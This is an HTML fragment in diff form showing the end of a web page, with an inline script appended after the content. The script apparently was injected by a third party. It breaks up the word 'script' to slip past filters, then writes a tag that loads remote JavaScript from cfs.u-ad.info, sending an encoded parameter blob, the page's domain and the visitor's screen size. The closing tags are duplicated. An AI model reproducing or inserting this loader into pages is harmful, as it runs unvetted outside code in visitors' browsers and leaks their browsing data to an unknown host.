+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3rqnZRXUijm6n5YyMle6m1X6RCGA%2bpsWubkrWac28uOdA%2bdIVhDxaYK6MfDZ2f9r3lxXgEDRQeP18mjAAMyU5%2bbreaQNex6cRAbishEy07wwgU24QIo4e8g%2fxGQnkCWOPwfBJ5zzKD4hpb6btJ%2fMARlvb5KOrZa7kihkijovc8VkobbdoZ%2fCgaHcDXwl5N1TVILHoNUXQqEWK59PFdXvxGfeeq2gvC7YiuD8aXN5simR6WBzYYuZRXBrFJFLBPnU5OwPz0%2bT5cpm8AH2xQCFbbhCMtplrXhxjLwwbui92rg6g8OE%2fUoGObovSpWs97jDG44jAlLhAxaeXqTAdZoFKp36bA9Cky4EPB%2bwDhk0ZMO2l3RljrW0v8b0sIjTWdALthl%2bfWUj3No%2bQsqoP2mTs0iH8ffWCsEENSHMIGqqIlQxMbKueeFITH8yhQF5Mbnr5cdbZn9umgq1urHckpIwtc");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
